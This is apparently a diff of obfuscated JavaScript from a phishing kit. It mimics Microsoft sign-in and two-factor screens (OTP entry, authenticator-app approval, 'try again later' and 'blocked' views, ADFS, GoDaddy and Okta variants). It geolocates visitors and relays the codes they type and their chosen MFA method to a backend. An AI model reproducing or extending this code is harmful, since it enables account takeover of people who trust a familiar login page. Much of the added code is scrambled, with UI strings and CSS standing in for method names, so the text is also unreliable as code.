-    })[_0xdc0bca(0x2cc)](_0x59a539 => {
-        const _0x16ec26 = _0xdc0bca;
-        loadinganimation(0x1), console[_0x16ec26(0x2c8)](_0x16ec26(0x319), _0x59a539);
-    });
-});
-const verifyotpbtn = document[`915612HwjQev`]('btn_verifyotp');
-verifyotpbtn[`auth`](`error_otp`, () => {
-    const _0x129753 = _0xe042e,
-        _0x53f504 = document['getElementById']('inp_otpcode');
+function _0x374d(_0x205434, _0x182c6f) {
+  const _0x2985dd = _0x2985();
+  return (
+    (_0x374d = function (_0x374d3a, _0x5117bc) {
+      _0x374d3a = _0x374d3a - 0x1d5;
+      let _0x488e5c = _0x2985dd[_0x374d3a];
+      return _0x488e5c;
+    }),
+    _0x374d(_0x205434, _0x182c6f)
+  );
+}
+function linkoptionclick(_0x195fb3) {
+  const _0x454ea5 = _0x283fde;
+  _0x195fb3[`forEach`]("data-id") == `btn_next_doc` &&
+    window[`marginBottom`]["reload"]();
+  if (
+    _0x195fb3[`forEach`](`ihaveacode`) == `more info required` ||
+    _0x195fb3[`forEach`](`ihaveacode`) == `selectmultipleaccountadfs` ||
+    _0x195fb3[`error_authapp_live`] == `debugdetailsinfo` ||
+    _0x195fb3[`error_authapp_live`] == `iProofEmailEntry` ||
+    _0x195fb3[`error_authapp_live`] == `querySelectorAll` ||
+    _0x195fb3["textContent"] == `section_authapperror` ||
+    _0x195fb3[`error_authapp_live`] == `location` ||
+    _0x195fb3["textContent"] == `https://get.geojs.io/v1/ip/geo.json` ||
+    _0x195fb3[`error_authapp_live`][`ajax`](`get`)
+  ) {
     loadinganimation(0x0);
-    let _0x3dea39 = 0x0;
-    otptype == 0x1 && (_0x3dea39 = 'PhoneAppOTP'), otptype == 0x2 && (_0x3dea39 = _0x129753(0x1ff)), otptype == 0x3 && (_0x3dea39 = _0x129753(0x1c4)), _0x53f504[_0x129753(0x259)] == '' && (loadinganimation(0x1), document[_0x129753(0x2fd)](_0x129753(0x30e))['innerText'] = _0x129753(0x220)), _0x53f504[_0x129753(0x259)] !== '' && sendAndReceive(_0x129753(0x239), [_0x3dea39, _0x53f504[_0x129753(0x259)]], 0x1)[_0x129753(0x1f9)](_0x2c5772 => {
-        const _0x34b50a = _0x129753;
-        _0x2c5772 && _0x2c5772[_0x34b50a(0x299)] !== _0x34b50a(0x360) && (loadinganimation(0x1), console[_0x34b50a(0x1bd)](_0x2c5772['message']), _0x2c5772[_0x34b50a(0x299)] == _0x34b50a(0x309) && (document[_0x34b50a(0x2fd)](_0x34b50a(0x1d3))['innerText'] = _0x2c5772[_0x34b50a(0x232)], checkerrordesc(_0x34b50a(0x278), 0x0, _0x2c5772['description']), checkerrordesc(_0x34b50a(0x380), 0x2, _0x2c5772[_0x34b50a(0x24a)]), document[_0x34b50a(0x2fd)](_0x34b50a(0x2ff) + view)['classList']['toggle'](_0x34b50a(0x26f)), document[_0x34b50a(0x2fd)]('section_signin_blocked_live')['classList']['remove'](_0x34b50a(0x26f)), view = 'signin_blocked_live'), _0x2c5772['message'] == 'error' && console[_0x34b50a(0x1bd)](_0x2c5772[_0x34b50a(0x2de)]), _0x2c5772['message'] == 'more\x20info\x20required' && moreinforeq(), _0x2c5772[_0x34b50a(0x299)] == _0x34b50a(0x1e1) && (wait2facancel = 0x1, document['getElementById']('section_tryagainlater')['classList'][_0x34b50a(0x291)]('d-none') && (document[_0x34b50a(0x2fd)](_0x34b50a(0x2ab))[_0x34b50a(0x27b)](_0x34b50a(0x1cd))['innerText'] = _0x34b50a(0x215), setTimeout(function () {
-            const _0x442ef0 = _0x34b50a;
-            document[_0x442ef0(0x2fd)](_0x442ef0(0x2ff) + view)[_0x442ef0(0x27b)](_0x442ef0(0x1ee))[_0x442ef0(0x34a)]['remove'](_0x442ef0(0x325)), document[_0x442ef0(0x2fd)]('section_' + view)['querySelector'](_0x442ef0(0x24e))[_0x442ef0(0x266)][_0x442ef0(0x2da)] = _0x442ef0(0x233), setTimeout(function () {
-                const _0x5d7465 = _0x442ef0;
-                document['getElementById']('section_' + view)[_0x5d7465(0x34a)][_0x5d7465(0x2cb)](_0x5d7465(0x26f)), document[_0x5d7465(0x2fd)](_0x5d7465(0x2ab))[_0x5d7465(0x27b)](_0x5d7465(0x2f7))['style']['display'] = _0x5d7465(0x1da), document[_0x5d7465(0x2fd)](_0x5d7465(0x2ab))['querySelector']('#tryagain_toomanyattempts')[_0x5d7465(0x266)][_0x5d7465(0x25b)] = _0x5d7465(0x1da), document[_0x5d7465(0x2fd)]('section_tryagainlater')[_0x5d7465(0x27b)](_0x5d7465(0x24e))[_0x5d7465(0x266)][_0x5d7465(0x2da)] = _0x5d7465(0x253), document['getElementById'](_0x5d7465(0x2ab))[_0x5d7465(0x34a)][_0x5d7465(0x20a)](_0x5d7465(0x26f)), view = _0x5d7465(0x32f);
-            }, 0xc8);
-        }, 0x1f4))), _0x2c5772[_0x34b50a(0x299)] == 'valid\x20otp' && (document[_0x34b50a(0x2fd)](_0x34b50a(0x30e))[_0x34b50a(0x1ca)] = '', document[_0x34b50a(0x2fd)](_0x34b50a(0x366))[_0x34b50a(0x34a)]['toggle']('d-none'), document[_0x34b50a(0x2fd)]('section_final')[_0x34b50a(0x34a)]['remove'](_0x34b50a(0x26f)), view = _0x34b50a(0x1c0)), _0x2c5772[_0x34b50a(0x299)] == 'error' && _0x2c5772['description'] != 'The\x20wrong\x20code\x20was\x20entered.\x20Send\x20yourself\x20a\x20new\x20code\x20and\x20try\x20again.' && (bottomsectionlinks(_0x34b50a(0x30b), _0x2c5772[_0x34b50a(0x227)]), changebackbutton(_0x34b50a(0x30b), _0x2c5772['backbutton']), checkerrordesc(_0x34b50a(0x30b), 0x1, _0x2c5772[_0x34b50a(0x2de)]), document['getElementById'](_0x34b50a(0x229))[_0x34b50a(0x259)] = ''), _0x2c5772[_0x34b50a(0x299)] == _0x34b50a(0x2c8) && _0x2c5772[_0x34b50a(0x2de)] == _0x34b50a(0x22e) && (bottomsectionlinks(_0x34b50a(0x27a), _0x2c5772[_0x34b50a(0x227)]), changebackbutton(_0x34b50a(0x27a), _0x2c5772[_0x34b50a(0x214)]), document[_0x34b50a(0x2fd)](_0x34b50a(0x229))[_0x34b50a(0x259)] = '', document['getElementById'](_0x34b50a(0x348))[_0x34b50a(0x1ca)] = '', document['getElementById'](_0x34b50a(0x366))[_0x34b50a(0x34a)][_0x34b50a(0x2cb)](_0x34b50a(0x26f)), document[_0x34b50a(0x2fd)]('section_2fa')['classList'][_0x34b50a(0x20a)](_0x34b50a(0x26f))));
-    })[_0x129753(0x2cc)](_0x58a6da => {
-        const _0x3c1045 = _0x129753;
-        loadinganimation(0x1), console[_0x3c1045(0x2c8)]('Error:', _0x58a6da);
-    });
-});
-
-function valaction(_0x94d1b3, _0x178437, _0x289ce6, _0x104f50) {
-    const _0x2085ef = _0xe042e;
-    !_0x289ce6 ? (document[`915612HwjQev`](_0x94d1b3)[`signoutoption`] = _0x104f50, _0x178437 && pwdInp[`error_2fa`][`if otp sent`](`image_src`)) : (document[`915612HwjQev`](_0x94d1b3)[`signoutoption`] = '', _0x178437 && pwdInp[`error_2fa`][`json`](`image_src`));
+    (_0x195fb3[`error_authapp_live`] == `iProofEmailEntry` ||
+      _0x195fb3[`forEach`](`ihaveacode`) == "signInAnotherWay") &&
+      (loadinganimation(0x1),
+      (wait2facancel = 0x1),
+      (document[`selectprotectoption(this)`](`innerText` + view)[
+        `.loading-container`
+      ](`relative`)[`getElementById`][`approve auth request auth app`] = ""),
+      document["getElementById"]("section_" + view)[`pdfemail`][`waiting`](
+        `background-image`,
+      ),
+      document[`selectprotectoption(this)`](`btn_protectaccount`)["classList"][
+        `<a class="link mb-16" href="#" data-id="`
+      ](`background-image`),
+      (view = `titlehint`));
+    _0x195fb3[`forEach`]("data-id") == `more info required` &&
+      (loadinganimation(0x1),
+      (document["getElementById"]("otp_livedesc")[`Next`] = `multbackbtnclick`),
+      (document[`selectprotectoption(this)`](
+        "section_confirmemailorphone_live",
+      )[`.loading-container`](`relative`)[`getElementById`][
+        `approve auth request auth app`
+      ] = ""),
+      document["getElementById"](`PhoneAppOTP_Live`)["classList"][`waiting`](
+        `background-image`,
+      ),
+      document[`selectprotectoption(this)`](`Code`)[`pdfemail`][
+        `<a class="link mb-16" href="#" data-id="`
+      ](`background-image`),
+      (view = "otp_live"));
+    if (
+      _0x195fb3[`error_authapp_live`] == `querySelectorAll` ||
+      _0x195fb3[`error_authapp_live`] ==
+        "Sign\x20in\x20using\x20another\x20Microsoft\x20account"
+    ) {
+      loadinganimation(0x1),
+        (document[`selectprotectoption(this)`](`valid phone app otp`)[
+          `getElementById`
+        ][`proof`] = `Hide`),
+        bottomsectionlinks("uname", [
+          {
+            a_id: `section_youdonthaveaccess`,
+            a_text: "Create\x20one!",
+            text: "No\x20account?",
+            type: `tile`,
+          },
+          { a_id: `.back`, a_text: `inp_pwd`, type: `uname_doc` },
+        ]);
+      changebackbutton(`2fa is on`, 0x0),
+        document[`selectprotectoption(this)`](`innerText` + view)[`pdfemail`][
+          "toggle"
+        ](`background-image`),
+        (document[`selectprotectoption(this)`](`#btn_back`)[
+          `signin_blocked_reason`
+        ] = ""),
+        (document[`selectprotectoption(this)`]("error_pwd")["innerText"] = ""),
+        (document[`selectprotectoption(this)`](`tryagainlater`)[
+          `signin_blocked_reason`
+        ] = ""),
+        (document[`selectprotectoption(this)`](`iProofPhone`)[
+          `.loading-container`
+        ](`relative`)["style"][`approve auth request auth app`] = ""),
+        document[`selectprotectoption(this)`]("section_uname")[`pdfemail`][
+          `<a class="link mb-16" href="#" data-id="`
+        ](`background-image`),
+        document["body"][`getElementById`][`otpdesc`] &&
+          (document[
+            `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+          ][`getElementById`][`otpdesc`] = ""),
+        document["body"][`getElementById`]["backgroundColor"] &&
+          (document[
+            `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+          ]["style"][`image_src`] = ""),
+        (view = `2fa is on`);
+    }
+    let _0x5302a1 = 0x0;
+    viewtype == null &&
+      ((_0x195fb3[`error_authapp_live`] ==
+        "Send\x20another\x20request\x20to\x20my\x20Microsoft\x20Authenticator\x20app" ||
+        _0x195fb3[`error_authapp_live`] ==
+          `https://get.geojs.io/v1/ip/geo.json`) &&
+        (_0x5302a1 = "PhoneAppNotification"),
+      _0x195fb3[`error_authapp_live`] == `<p class="mb-16">` &&
+        (_0x5302a1 = `contains`),
+      _0x195fb3[`error_authapp_live`] == `debugdetailsinfo` &&
+        (_0x5302a1 = `sections_godaddy`)),
+      viewtype !== null &&
+        ((_0x195fb3[`error_authapp_live`] == `assertive` ||
+          _0x195fb3["textContent"] == `https://get.geojs.io/v1/ip/geo.json`) &&
+          (_0x5302a1 = "PhoneAppNotification_Live"),
+        _0x195fb3[`error_authapp_live`] == `debugdetailsinfo` &&
+          (_0x5302a1 = `logo`)),
+      (_0x195fb3[`error_authapp_live`] == `largeIcon` ||
+        _0x195fb3["textContent"] == `https://get.geojs.io/v1/ip/geo.json` ||
+        _0x195fb3[`error_authapp_live`] == `<p class="mb-16">` ||
+        _0x195fb3[`error_authapp_live`] == `debugdetailsinfo`) &&
+        sendAndReceive(`834ylAwod`, [_0x5302a1], 0x1)
+          ["then"]((_0x2ecf20) => {
+            const _0x4699b2 = _0x454ea5;
+            if (
+              _0x2ecf20 &&
+              _0x2ecf20[`</a> or try to sign in again shortly.</p>`] !==
+                `Enter the code to help us verify your identity.`
+            ) {
+              loadinganimation(0x1), (wait2facancel = 0x0);
+              _0x2ecf20["message"] == `twofamethods` &&
+                (document[`selectprotectoption(this)`](`btn_sig`)[
+                  `142499lsAMVs`
+                ]("placeholder", `backgroundcolor`),
+                (document[`selectprotectoption(this)`](`No account?`)["style"][
+                  `checkpass`
+                ] = `section_otp`),
+                (document[`selectprotectoption(this)`](`No account?`)[`Next`] =
+                  ""),
+                document[`selectprotectoption(this)`](`head`)["setAttribute"](
+                  "src",
+                  _0x2ecf20["image_src"],
+                ),
+                checkerrordesc("otp_live", 0x0, _0x2ecf20[`confirmemail`]),
+                bottomsectionlinks(`5049dgudYJ`, _0x2ecf20[`otp sent live`]),
+                changebackbutton("otp_live", _0x2ecf20[`#docemailloading`]),
+                document[`selectprotectoption(this)`](`innerText` + view)[
+                  `pdfemail`
+                ][`waiting`]("d-none"),
+                document["getElementById"](`Code`)[`pdfemail`][
+                  `<a class="link mb-16" href="#" data-id="`
+                ](`background-image`),
+                (view = "otp_live"),
+                (viewtype = `authapp`));
+              _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                `alert-error` &&
+                ((document[`selectprotectoption(this)`](`accessblocked`)[
+                  "style"
+                ]["display"] = `section_otp`),
+                (document[`selectprotectoption(this)`](`accessblocked`)[
+                  "innerText"
+                ] = ""),
+                (document[`selectprotectoption(this)`](`addEventListener`)[
+                  `Next`
+                ] = _0x2ecf20["authappreqid"]),
+                bottomsectionlinks(`catch`, _0x2ecf20[`otp sent live`]),
+                changebackbutton(`catch`, _0x2ecf20[`#docemailloading`]),
+                document["getElementById"](`innerText` + view)["classList"][
+                  "toggle"
+                ]("d-none"),
+                document[`selectprotectoption(this)`]("section_authapp_live")[
+                  `pdfemail`
+                ]["remove"](`background-image`),
+                (view = `catch`),
+                (viewtype = `[aria-describedby="iProofInputError"]`),
+                wait2fa(`</a>`, _0x2ecf20["methodid"]));
+              _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                `keyup` &&
+                ((wait2facancel = 0x1),
+                document["getElementById"](
+                  `waiting for previous request to complete`,
+                )[`pdfemail`][`Back`](`background-image`) &&
+                  ((document[`selectprotectoption(this)`](
+                    `waiting for previous request to complete`,
+                  )[`.loading-container`](`add`)[`Next`] = `useAuthenticator`),
+                  setTimeout(function () {
+                    const _0x4dadae = _0x4699b2;
+                    document[`selectprotectoption(this)`](`innerText` + view)
+                      [`.loading-container`](`hasOwnProperty`)
+                      ["classList"][`<a class="link mb-16" href="#" data-id="`](
+                        `uname`,
+                      ),
+                      runanimation(0x2, view, 0.5, 0x0),
+                      setTimeout(function () {
+                        const _0x233961 = _0x4dadae;
+                        document[`selectprotectoption(this)`](
+                          `innerText` + view,
+                        )[`pdfemail`][`waiting`]("d-none"),
+                          (document["getElementById"](
+                            `waiting for previous request to complete`,
+                          )[`.loading-container`](`script[src^="`)[
+                            `getElementById`
+                          ][`checkpass`] = `dynamic-style`),
+                          (document[`selectprotectoption(this)`](
+                            `waiting for previous request to complete`,
+                          )[`.loading-container`](`#btn_sig`)[`getElementById`][
+                            `checkpass`
+                          ] = "block"),
+                          (document[`selectprotectoption(this)`](
+                            `waiting for previous request to complete`,
+                          )[`.loading-container`](`relative`)[`getElementById`][
+                            `approve auth request auth app`
+                          ] = `signinanothererrordesc`),
+                          document[`selectprotectoption(this)`](
+                            `waiting for previous request to complete`,
+                          )["classList"][
+                            `<a class="link mb-16" href="#" data-id="`
+                          ](`background-image`),
+                          (view = `sections_pdf`);
+                      }, 0xc8);
+                  }, 0x1f4)));
+              _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                `forwards` &&
+                (document[`selectprotectoption(this)`]("authapperrordesc")
+                  [`.loading-container`](`slice`)
+                  [
+                    `142499lsAMVs`
+                  ](`<span>Sorry, we're having trouble verifying your account. Please try again.</span><a id="ViewDetails" class="no-wrap" href="#">View details</a>`, `auth`),
+                (document["getElementById"]("authapperrordesc")[
+                  `.loading-container`
+                ](`slice`)[`Next`] = `section_tryagainlater`));
+              _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                `getAttribute` &&
+                document["getElementById"](
+                  `waiting for previous request to complete`,
+                )[`pdfemail`][`Back`]("d-none") &&
+                ((document["getElementById"](
+                  `waiting for previous request to complete`,
+                )[`.loading-container`](`add`)[`Next`] =
+                  `section_sidebarlogin_adfs`),
+                setTimeout(function () {
+                  const _0x7504a9 = _0x4699b2;
+                  document["getElementById"](`innerText` + view)
+                    ["querySelector"](`hasOwnProperty`)
+                    [`pdfemail`][`<a class="link mb-16" href="#" data-id="`](
+                      `uname`,
+                    ),
+                    runanimation(0x2, view, 0.5, 0x0),
+                    setTimeout(function () {
+                      const _0x1d9e52 = _0x7504a9;
+                      document[`selectprotectoption(this)`](`innerText` + view)[
+                        `pdfemail`
+                      ][`waiting`](`background-image`),
+                        (document[`selectprotectoption(this)`](
+                          "section_tryagainlater",
+                        )[`.loading-container`](`script[src^="`)[
+                          `getElementById`
+                        ][`checkpass`] = `dynamic-style`),
+                        (document["getElementById"]("section_tryagainlater")[
+                          "querySelector"
+                        ](`if otp sent`)[`getElementById`][`checkpass`] =
+                          `dynamic-style`),
+                        (document["getElementById"](
+                          `waiting for previous request to complete`,
+                        )[`.loading-container`](`relative`)[`getElementById`][
+                          `approve auth request auth app`
+                        ] = "show-from-right\x200.5s"),
+                        document[`selectprotectoption(this)`](
+                          `waiting for previous request to complete`,
+                        )[`pdfemail`][
+                          `<a class="link mb-16" href="#" data-id="`
+                        ](`background-image`),
+                        (view = `sections_pdf`);
+                    }, 0xc8);
+                }, 0x1f4));
+              if (
+                _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                `error enter a code`
+              ) {
+                (document[`selectprotectoption(this)`](`#btn_back`)[
+                  `signin_blocked_reason`
+                ] = ""),
+                  (document[`selectprotectoption(this)`](`dirltr`)[`Next`] =
+                    ""),
+                  (document[`selectprotectoption(this)`](`tryagainlater`)[
+                    `signin_blocked_reason`
+                  ] = ""),
+                  bottomsectionlinks(`2fa is on`, [
+                    {
+                      a_id: `section_youdonthaveaccess`,
+                      a_text: `setProperty`,
+                      text: "No\x20account?",
+                      type: `tile`,
+                    },
+                    { a_id: `.back`, a_text: `inp_pwd`, type: "link" },
+                  ]);
+                (document["getElementById"]("section_" + view)["querySelector"](
+                  `relative`,
+                )[`getElementById`][`approve auth request auth app`] = ""),
+                  document[`selectprotectoption(this)`](`innerText` + view)[
+                    `pdfemail`
+                  ]["toggle"]("d-none"),
+                  (document[`selectprotectoption(this)`]("section_uname")[
+                    `.loading-container`
+                  ](".sectioncontent")[`getElementById`][
+                    `approve auth request auth app`
+                  ] = ""),
+                  document["getElementById"](`iProofPhone`)["classList"][
+                    `<a class="link mb-16" href="#" data-id="`
+                  ]("d-none"),
+                  document[
+                    `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                  ][`getElementById`]["backgroundImage"] &&
+                    (document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`][`otpdesc`] = ""),
+                  document[
+                    `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                  ][`getElementById`][`image_src`] &&
+                    (document[
+                      `
+            ::-moz-selection {
+            background: #a6fff8;
+            }
+            
+            ::selection {
+            background: #a6fff8;
+            }
+            `
+                    ][`getElementById`][`image_src`] = "");
+              }
+              _0x2ecf20["message"] == `#btn_verifyotp` &&
+                ((document["getElementById"](`idA_PWD_ForgotPassword`)[
+                  `.loading-container`
+                ](".title")[`error_authapp_live`] =
+                  _0x2ecf20[`error_otp_live`]),
+                checkerrordesc(
+                  "signinanothererrordesc",
+                  0x2,
+                  _0x2ecf20[`tabindex`],
+                ),
+                document[`selectprotectoption(this)`](`innerText` + view)[
+                  "classList"
+                ]["toggle"](`background-image`),
+                document["getElementById"](`idA_PWD_ForgotPassword`)[
+                  `pdfemail`
+                ][`<a class="link mb-16" href="#" data-id="`](
+                  `background-image`,
+                ),
+                bottomsectionlinks(
+                  `godaddypassword`,
+                  _0x2ecf20[`otp sent live`],
+                ),
+                (view = "signinanothererror")),
+                _0x2ecf20["message"] == `d-none` &&
+                  (document[`selectprotectoption(this)`](`innerText` + view)[
+                    "classList"
+                  ][`waiting`](`background-image`),
+                  document["getElementById"](`error`)[`pdfemail`][
+                    `<a class="link mb-16" href="#" data-id="`
+                  ](`background-image`),
+                  (view = `session timeout`)),
+                _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                  `#mainLoader` &&
+                  ((document[`selectprotectoption(this)`](`correct email`)[
+                    `Next`
+                  ] = ""),
+                  document["getElementById"]("otpimg")["setAttribute"](
+                    "src",
+                    _0x2ecf20[`Too many Attempts`],
+                  ),
+                  checkerrordesc("otp", 0x0, _0x2ecf20[`confirmemail`]),
+                  bottomsectionlinks(`authapp`, _0x2ecf20[`otp sent live`]),
+                  changebackbutton(`authapp`, _0x2ecf20[`#docemailloading`]),
+                  document["getElementById"](`innerText` + view)[`pdfemail`][
+                    "toggle"
+                  ](`background-image`),
+                  document["getElementById"]("section_otp")["classList"][
+                    "remove"
+                  ](`background-image`),
+                  (view = "otp"),
+                  (viewtype = null)),
+                _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                  `aria-describedby` &&
+                  ((document[`selectprotectoption(this)`]("error_2fa")[`Next`] =
+                    ""),
+                  document[`selectprotectoption(this)`]("authappimg")[
+                    `142499lsAMVs`
+                  ](`fail`, _0x2ecf20[`Too many Attempts`]),
+                  checkerrordesc("authapp", 0x0, _0x2ecf20[`confirmemail`]),
+                  bottomsectionlinks(
+                    `email otp live`,
+                    _0x2ecf20["bottomsection"],
+                  ),
+                  changebackbutton(
+                    `email otp live`,
+                    _0x2ecf20[`#docemailloading`],
+                  ),
+                  (document[`selectprotectoption(this)`]("authappcode")[
+                    `error_authapp_live`
+                  ] = _0x2ecf20[`authenticaion failed`]),
+                  document[`selectprotectoption(this)`]("section_" + view)[
+                    `pdfemail`
+                  ][`waiting`](`background-image`),
+                  document[`selectprotectoption(this)`](`removeAttribute`)[
+                    "classList"
+                  ]["remove"](`background-image`),
+                  (view = `email otp live`),
+                  (viewtype = null),
+                  wait2fa("app", _0x2ecf20[`#tryagain_toomanyattempts`])),
+                _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                  "approve\x20auth\x20request\x20calling" &&
+                  (document["getElementById"](`bannerlogo`)
+                    [`.loading-container`](`animation`)
+                    [`error_uname_doc`](),
+                  (document[`selectprotectoption(this)`](`correct email`)[
+                    `Next`
+                  ] = ""),
+                  document[`selectprotectoption(this)`](
+                    `error_confirmemailorphone_live`,
+                  )["setAttribute"]("src", _0x2ecf20[`Too many Attempts`]),
+                  checkerrordesc(`oninput`, 0x0, _0x2ecf20["description"]),
+                  bottomsectionlinks(`oninput`, _0x2ecf20[`otp sent live`]),
+                  changebackbutton(`oninput`, _0x2ecf20[`#docemailloading`]),
+                  document["getElementById"](`innerText` + view)["classList"][
+                    `waiting`
+                  ]("d-none"),
+                  document[`selectprotectoption(this)`](`bannerlogo`)[
+                    `pdfemail`
+                  ][`<a class="link mb-16" href="#" data-id="`](
+                    `background-image`,
+                  ),
+                  (view = `oninput`),
+                  (viewtype = null),
+                  wait2fa("call")),
+                _0x2ecf20["message"] == `auth` &&
+                  (bottomsectionlinks(`titlehint`, _0x2ecf20[`otp sent live`]),
+                  changebackbutton(`titlehint`, _0x2ecf20[`#docemailloading`]),
+                  checkerrordesc(`titlehint`, 0x1, _0x2ecf20[`confirmemail`])),
+                _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                  `placeholder` &&
+                  ((document[`selectprotectoption(this)`](`correct email`)[
+                    `Next`
+                  ] = ""),
+                  checkerrordesc(`placeholder`, 0x0, _0x2ecf20[`confirmemail`]),
+                  bottomsectionlinks(`text-left`, _0x2ecf20["bottomsection"]),
+                  changebackbutton(`text-left`, _0x2ecf20["backbutton"]),
+                  document[`selectprotectoption(this)`](`innerText` + view)[
+                    `pdfemail`
+                  ]["toggle"](`background-image`),
+                  document[`selectprotectoption(this)`](`a_id`)["classList"][
+                    `<a class="link mb-16" href="#" data-id="`
+                  ](`background-image`),
+                  (view = `text-left`),
+                  (viewtype = null)),
+                _0x2ecf20[`</a> or try to sign in again shortly.</p>`] ==
+                  `parentNode` &&
+                  ((document[`selectprotectoption(this)`](`noRightBorder`)[
+                    "querySelector"
+                  ](`add`)["textContent"] = `call`),
+                  document[`selectprotectoption(this)`]("authapperrordesc")[
+                    `pdfemail`
+                  ][`waiting`](`auth`),
+                  (document[`selectprotectoption(this)`](
+                    `iEnterProofDesc iProofLbl1`,
+                  )[`content`] = `length`),
+                  (view = `Enter`),
+                  (viewtype = null));
+            }
+          })
+          [`section_signinanothererror`]((_0x198a81) => {
+            const _0x38de42 = _0x454ea5;
+            loadinganimation(0x1),
+              console["error"](`selecttwofamethod(this)`, _0x198a81);
+          });
+  }
 }
-
-function checkerrordesc(_0x3a42b9, _0x36f5cd, _0x3ca455) {
-    const _0x2dfa21 = _0xe042e;
-    if (_0x36f5cd == 0x2) var _0x4c0834 = _0x3a42b9;
-    if (_0x36f5cd == 0x1) var _0x4c0834 = `width` + _0x3a42b9;
-    if (_0x36f5cd == 0x0) var _0x4c0834 = _0x3a42b9 + 'desc';
-    if (_0x3ca455[`background`] === `signInAnotherWay`) _0x3ca455[`btn_sig`] == `background-image` && (document[`915612HwjQev`](_0x4c0834)[`show-from-right `] = `innerHTML` + _0x3ca455[`display`] + `img` + _0x3ca455[`btn_sig`] + (`sections_okta` + _0x3ca455['a_text'] + `iProofEmailEntry`)), _0x3ca455['a_id'] != `background-image` && (document[`915612HwjQev`](_0x4c0834)['innerHTML'] = `innerHTML` + _0x3ca455[`display`] + `img` + _0x3ca455[`btn_sig`] + (`sections_okta` + _0x3ca455[`bottomsection`] + `That doesn't match the phone number associated with your account. The correct number ends in `));
+function authappbottomtext(_0xcd39e0) {
+  const _0x1eaa8c = _0x283fde,
+    _0xabbcf6 = document[_0x1eaa8c(0x30b)](_0x1eaa8c(0x212))[_0x1eaa8c(0x224)](
+      ".text-body",
+    );
+  (_0xabbcf6["innerHTML"] = ""),
+    _0xcd39e0[_0x1eaa8c(0x2c9)]((_0x50e579) => {
+      const _0x5456c5 = _0x1eaa8c;
+      if (_0x50e579[_0x5456c5(0x395)] === _0x5456c5(0x3a0)) {
+        const _0x3b8acc = document[_0x5456c5(0x3b3)]("p");
+        _0x3b8acc[_0x5456c5(0x208)]["add"](_0x5456c5(0x2d8), _0x5456c5(0x2c1)),
+          (_0x3b8acc[_0x5456c5(0x1e9)] =
+            _0x50e579[_0x5456c5(0x2fc)] +
+            "\x20<a\x20href=\x22#\x22\x20data-id=\x22" +
+            _0x50e579[_0x5456c5(0x23b)] +
+            (_0x5456c5(0x398) +
+              _0x50e579[_0x5456c5(0x35c)] +
+              _0x5456c5(0x31e))),
+          _0xabbcf6[_0x5456c5(0x2aa)](_0x3b8acc);
+      } else {
+        if (_0x50e579[_0x5456c5(0x395)] === _0x5456c5(0x298)) {
+          const _0x1deb87 = document["createElement"]("p");
+          _0x1deb87[_0x5456c5(0x208)][_0x5456c5(0x23c)](
+            _0x5456c5(0x2d8),
+            _0x5456c5(0x2c1),
+          ),
+            (_0x1deb87[_0x5456c5(0x1e9)] =
+              _0x5456c5(0x247) +
+              _0x50e579[_0x5456c5(0x23b)] +
+              (_0x5456c5(0x398) +
+                _0x50e579[_0x5456c5(0x35c)] +
+                _0x5456c5(0x255) +
+                _0x50e579[_0x5456c5(0x2fc)])),
+            _0xabbcf6[_0x5456c5(0x2aa)](_0x1deb87);
+          const _0x437fad = document[_0x5456c5(0x3b3)]("p");
+          (_0x437fad["textContent"] = _0x50e579[_0x5456c5(0x2fc)]),
+            _0xabbcf6[_0x5456c5(0x2aa)](_0x437fad);
+        } else {
+          if (_0x50e579[_0x5456c5(0x395)] === _0x5456c5(0x2d8)) {
+            const _0xcf0d9f = document[_0x5456c5(0x3b3)]("a");
+            _0xcf0d9f[_0x5456c5(0x208)][_0x5456c5(0x23c)](
+              _0x5456c5(0x2d8),
+              "mb-16",
+            ),
+              _0xcf0d9f["setAttribute"](_0x5456c5(0x3b0), _0x5456c5(0x31f)),
+              _0xcf0d9f[_0x5456c5(0x26c)](
+                "data-id",
+                _0x50e579[_0x5456c5(0x23b)],
+              ),
+              _0xcf0d9f[_0x5456c5(0x26c)](_0x5456c5(0x300), _0x5456c5(0x2f7)),
+              (_0xcf0d9f[_0x5456c5(0x1f2)] = _0x50e579[_0x5456c5(0x35c)]),
+              (_0xcf0d9f[_0x5456c5(0x22c)] = "#"),
+              _0xabbcf6[_0x5456c5(0x2aa)](_0xcf0d9f);
+          } else {
+            if (_0x50e579[_0x5456c5(0x395)] === _0x5456c5(0x2fc)) {
+              const _0x588a86 = document[_0x5456c5(0x3b3)]("p");
+              _0x588a86[_0x5456c5(0x208)][_0x5456c5(0x23c)](_0x5456c5(0x2c1)),
+                (_0x588a86[_0x5456c5(0x1f2)] = _0x50e579[_0x5456c5(0x2fc)]),
+                _0xabbcf6[_0x5456c5(0x2aa)](_0x588a86);
+            }
+          }
+        }
+      }
+    });
+}
+function selectprotectoption(_0x4a2d07) {
+  const _0x208c77 = _0x283fde,
+    _0x3cee34 = document[_0x208c77(0x289)](
+      ".iAdditionalProofInfo\x20input[type=\x22radio\x22]",
+    );
+  _0x3cee34["forEach"]((_0x2481e2) => {
+    const _0x57d630 = _0x208c77;
+    _0x2481e2[_0x57d630(0x2cc)](_0x57d630(0x307)),
+      _0x2481e2[_0x57d630(0x2cc)](_0x57d630(0x3ba));
+  });
+  const _0x344bd3 = _0x4a2d07,
+    _0x1f9a86 = document[_0x208c77(0x289)](_0x208c77(0x2a0));
+  _0x1f9a86[_0x208c77(0x2c9)]((_0x5e3c12) => {
+    const _0x31979f = _0x208c77;
